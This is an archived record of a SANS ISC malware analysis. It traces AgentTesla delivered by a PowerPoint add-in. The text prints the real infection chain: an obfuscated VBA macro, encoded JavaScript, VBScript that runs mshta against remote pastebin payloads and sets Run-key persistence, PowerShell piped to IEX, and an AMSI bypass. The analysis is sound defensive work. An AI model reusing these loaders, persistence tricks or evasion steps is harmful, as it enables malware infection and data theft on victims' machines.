{
    "id": "8934b8da-3d42-4116-bc5f-a14502e1becb",
    "created_at": "2023-01-12T15:05:43.774869Z",
    "updated_at": "2025-03-27T02:05:31.41796Z",
    "deleted_at": null,
    "sha1_hash": "48c4a6a13002371bf1e428782a67a1034a5f6394",
    "title": "2020-05-23 - AgentTesla Delivered via a Malicious PowerPoint Add-In",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:30Z",
    "file_modification_date": "2022-05-28T15:57:30Z",
    "file_size": 656352,
    "plain_text": "# SANS ISC: AgentTesla Delivered via a Malicious PowerPoint Add-In - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**[isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162/](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162/)**\n\n## ← Next Thread Previous Thread →\n\n AgentTesla Delivered via a Malicious PowerPoint Add-In\n\n Attackers are always trying to find new ways to deliver malicious code to their victims. Microsoft Word and Excel are documents that can be easily\n\n While hunting, I found an interesting document disguised as a PowerPoint template (with the extension ‘.pot’) delivered within a classic phishing e\n\n Sub Auto_Open() - Gets executed immediately after the presentation is opened. Sub Auto_Close() - Gets executed prior to the presentation is closed. Sub Auto_Print() - Gets executed prior to the presentation being printed. Sub Auto_ShowBegin() - Gets executed when the show begins. Sub Auto_ShowEnd() - Gets executed when the show ends. Sub Auto_NextSlide(Index as Long) - Gets executed before the slideshow moves onto the next slide. The index represents the SlideIndex o\n\n Two macros are fired automatically within an add-in. Auto_Open() and Auto_Close(). Auto_Open() is fired when the add-in is loaded and Auto_Clo\n\n The document (SHA256:b345b73a72f866ac3bc2945467d2678ca4976dd4c51bd0f2cdb142a79f56210a[2]) that I found contains an Auto_Close() m\n```\n root@remnux:/malwarezoo# file Payments\\ detail.pot\n Payments detail.pot: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Title: payments,\n root@remnux:/malwarezoo# oledump.py Payments\\ detail.pot\n  1:   2784 '\\x05DocumentSummaryInformation'\n  2:    380 '\\x05SummaryInformation'\n  3:    445 'PROJECT'\n  4:    26 'PROJECTwm'\n  5: M  1921 'VBA/Module1'\n  6:   2454 'VBA/_VBA_PROJECT'\n  7:   1377 'VBA/__SRP_0'\n  8:    88 'VBA/__SRP_1'\n  9:    392 'VBA/__SRP_2'\n 10:    103 'VBA/__SRP_3'\n 11:    493 'VBA/dir'\n root@remnux:/malwarezoo# oledump.py Payments\\ detail.pot -s 5 -v\n Attribute VB_Name = \"Module1\"\n  Sub auto_close()\n     Dim yoCgYQoJx As Object\n     Dim r5ozCUcyJ As String\n     Dim a4CItAIOl As String\n     Dim PhS6Kx17B As String\n     PhS6Kx17B = (\"W\" + \"S\" + \"c\" + \"ript.Shell\")\n     Set yoCgYQoJx = CreateObject(PhS6Kx17B)\n     r5ozCUcyJ = StrReverse(\"\"\"a'*'zaebba'*'a'*'d\\p'*'.j\\\\:ptth\"\"\"\"aths'*'\"\"\")\n     a4CItAIOl = Replace(r5ozCUcyJ, \"'*'\", \"m\")\n     yoCgYQoJx.Run a4CItAIOl\n End Sub\n\n When the victim opens the ‘Payments detail.pot’ file, PowerPoint is launched and the add-in silently installed. Seeing that no content is displayed\n\n You can see the installed Add-ins in the PowerPoint options:\n\n```\n\n-----\n\n## The macro simply launches an URL. In this case, Windows will try to open with the default browser. The malicious URL is:\n```\nhxxp://j[.]mp/dmamabbeazma\n\n This HTTP request returns a 301 to a pastie:\nhxxps://pastebin[.]com/raw/U78a8pxJ\n\n Here is the pastie content (some Javascript code):\n\n```\n\n-----\n\n```\n<!-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%72%65%37%31%66%63%33%31%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%7\neval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%72%65%37%31%66%63%33%31%28%27') +\n'%39%70%62%71%63%71%76%24%6d%66%72%6c%7f%64%6c%60%3a%2c%2b%25%3c%3b%38%2a%20%30%3f%38%2f%20%32%36%3d%2e%26%3e%39%38%20%22%36%34%33%35%\nunescape('%27%29%29%3b'));\n// -->\n</script>\n\n## The decode version shows more payloads being downloaded:\nfunction re71fc31(s) {\n var r = \"\";\n var tmp = s.split(\"8863930\");\n s = unescape(tmp[0]);\n k = unescape(tmp[1] + \"635258\");\n for( var i = 0; i < s.length; i++) {\n  r += String.fromCharCode((parseInt(k.charAt(i%k.length))^s.charCodeAt(i))+-2); \n }\n return r;\n}\ndocument.write(re71fc31('%39%70%62%71%63%71%76%24%6d%66%72%6c%7f%64%6c%60%3a%2c%2b%25%3c%3b%38%2a%20%30%3f%38%2f%20%32%36%3d%2e%26%3e%\n0'));\n\n And, the decoded payload:\n<script language=\"&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\">\nCreateObject(\"WScript.Shell\").Run \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\3rM9m42v\"\"\"\nCreateObject(\"WScript.Shell\").Run StrReverse(\"/ 08 om/ ETUNIM cs/ etaerc/ sksathcs\") + \"tn \"\"Xvideos\"\" /tr \"\"\\\"\"mshta\\\"\" hxxp:\\\\pasteb\nCreateObject(\"WScript.Shell\").RegWrite StrReverse(\"TRATS\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\" + \"t\"\nCreateObject(\"WScript.Shell\").RegWrite StrReverse(\"\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\" + \"t\" + \"a\nself.close\n</script>\n\n The script fetches two extra payloads from pastebin.com, one of them was already removed but I successfully grabbed a copy. Both are identical,\n<script language=\"&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\">\nCreateObject(\"WScript.Shell\").RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\bin\", \"mshta vbscript:Execute(\"\"CreateObjec\nCreateObject(\"Wscript.Shell\").regwrite \"HKCU\\Software\\iamresearcher\", \"$fucksecurityresearchers='contactmeEX'.replace('contactme','I')\nConst HIDDEN_WINDOW = 0\nstrComputer = \".\"\nSet objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")\nSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\nSet objConfig = objStartup.SpawnInstance_\nobjConfig.ShowWindow = HIDDEN_WINDOW\nSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")\nerrReturn = objProcess.Create( \"powershell ((gp HKCU:\\Software).iamresearcher)|IEX\", null, objConfig, intProcessID)\n'i am not a coder not a expert i am script kiddie expert i read code from samples on site then compile in my way\n'i am not a coder ;) i watch you on twitter every day thanks :) i love my code reports!\n'i am not a coder! bang ;)\nself.close\n</script>\n\n (Note the funny comments at the end of the script)\n\n Two new pasties are fetched. Here is the decoded content (PowerShell code):\n\n```\n\n-----\n\n```\n  [CmdletBinding()]\n   Param ([byte[]] $byteArray)\n  Process {\n   Write-Verbose \"Get-DecompressedByteArray\"\n   $input = New-Object System.IO.MemoryStream(, $byteArray )\n   $output = New-Object System.IO.MemoryStream\n   $01774000 = New-Object System.IO.Compression.GzipStream $input,    \n           ([IO.Compression.CompressionMode]::Decompress)\n   $puffpass = New-Object byte[](1024)\n   while($true) {\n    $read = $01774000.Read($puffpass, 0, 1024)\n    if ($read -le 0){break}\n    $output.Write($puffpass, 0, $read)\n   }\n   [byte[]] $bout333 = $output.ToArray()\n   Write-Output $bout333\n  }\n }\n $t0='DEX'.replace('D','I');sal g $t0;[Byte[]]$MNB=('@!1F,@!8B,@!08,@!00,@!00,@!00,@!00,@!00,@!04,@!00,@!ED,@!7C,@!79,@!5C,@!53,@!47,@!\n [stuff removed]\n 7F,@!33,@!D0,@!4A,@!F9,@!3E,@!89,@!0D,@!DF,@!D6,@!F3,@!4D,@!3E,@!3D,@!8C,@!3C,@!08,@!46,@!20,@!B6,@!2B,@!82,@!28,@!30,@!41,@!FD,@!18,@\n [Byte[]]$blindB=('@!1F,@!8B,@!08,@!00,@!00,@!00,@!00,@!00,@!04,@!00,@!CC,@!BD,@!07,@!78,@!14,@!55,@!DB,@!3F,@!3C,@!BB,@!D9,@!6C,@!76,@\n [stuff removed]\n F2,@!D3,@!57,@!FF,@!E7,@!66,@!03,@!86,@!AC,@!3C,@!96,@!D0,@!16,@!EC,@!FD,@!F1,@!99,@!5B,@!54,@!79,@!24,@!D3,@!AC,@!14,@!4A,@!8E,@!17,@\n [byte[]]$deblindB = UNpaC0k3333300001147555 $blindB\n $blind=[System.Reflection.Assembly]::Load($deblindB)\n [Amsi]::Bypass()\n [byte[]]$decompressedByteArray = UNpaC0k3333300001147555 $MNB\n\n## The two hex-encoded chunks of data decoded into a DLL and a PE. The PE is an AgentTesla malware (SHA256: d46615754e00e004d683ff2ad5\n\n Conclusion: PowerPoint can also be used to deliver malicious content!\n\n [1] https://docs.microsoft.com/en-us/office/dev/add-ins/tutorials/powerpoint-tutorial\n [2] https://www.virustotal.com/gui/file/b345b73a72f866ac3bc2945467d2678ca4976dd4c51bd0f2cdb142a79f56210a/detection\n [3] https://www.virustotal.com/gui/file/d46615754e00e004d683ff2ad5de9bca976db9d110b43e0ab0f5ae35c652fab7/detection\n\n Xavier Mertens (@xme) Senior ISC Handler - Freelance Cyber Security Consultant PGP Key\n\n I will be teaching next: Reverse-Engineering Malware: Malware Analysis Tools and Techniques - SANS London June 2022\n\n ← Next Thread Previous Thread →\n\n Sign Up for Free or Log In to start participating in the conversation!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-23 - AgentTesla Delivered via a Malicious PowerPoint Add-In.pdf"
    ],
    "report_names": [
        "2020-05-23 - AgentTesla Delivered via a Malicious PowerPoint Add-In.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535943,
    "ts_updated_at": 1743041131,
    "ts_creation_date": 1653753450,
    "ts_modification_date": 1653753450,
    "files": {
        "pdf": "https://archive.orkl.eu/48c4a6a13002371bf1e428782a67a1034a5f6394.pdf",
        "text": "https://archive.orkl.eu/48c4a6a13002371bf1e428782a67a1034a5f6394.txt",
        "img": "https://archive.orkl.eu/48c4a6a13002371bf1e428782a67a1034a5f6394.jpg"
    }
}